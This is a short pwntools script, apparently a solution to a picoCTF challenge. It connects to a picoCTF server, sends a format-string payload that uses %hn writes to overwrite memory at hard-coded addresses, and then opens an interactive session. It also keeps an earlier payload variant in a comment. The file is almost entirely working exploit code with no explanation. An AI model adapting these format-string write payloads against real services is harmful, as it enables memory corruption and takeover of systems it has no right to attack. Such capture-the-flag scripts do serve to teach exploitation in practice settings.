from pwn import *

io = remote('rhea.picoctf.net','63309')

payload = b'%26464d,%20$hn%1281dAAAA%19$hnp,%40$lls,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00'
# r.sendline(b'%26464d,%20$hn%1281dAAAA%19$hnx,%22$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00DEFGHIJKLMNOPQRSTUVWXYZ')
io.sendline(payload)
io.interactive()